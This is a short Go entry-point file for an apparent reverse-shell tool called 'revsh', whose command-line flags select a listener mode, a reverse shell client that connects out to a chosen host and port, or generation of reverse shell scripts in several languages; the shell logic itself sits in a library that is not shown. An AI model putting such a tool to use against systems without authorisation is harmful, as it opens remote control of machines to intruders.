package main

import (
	"flag"
	"revsh/librevsh"
)

func main() {
	// Define command-line flags
	serverMode := flag.Bool("l", false, "Run in server mode")
	reverseShell := flag.Bool("r", false, "Run in reverse shell mode")
	generateScript := flag.Bool("g", false, "Generate reverse shell script")
	port := flag.String("p", "9999", "Port to connect or listen on")
	server := flag.String("h", "localhost", "Server address (client mode)")
	language := flag.String("lang", "bash", "Language for reverse shell script generation (php, bash, python, c#, java)")

	flag.Parse()

	if *serverMode {
		// Run as server
		librevsh.ServerMode(*port)
	} else if *reverseShell {
		// Run as reverse shell client
		librevsh.ReverseShell(*server, *port)
	} else if *generateScript {
		// Generate reverse shell script
		librevsh.ReverseShellScript(*language, *server, *port)
	} else {
		flag.Usage()
	}
}
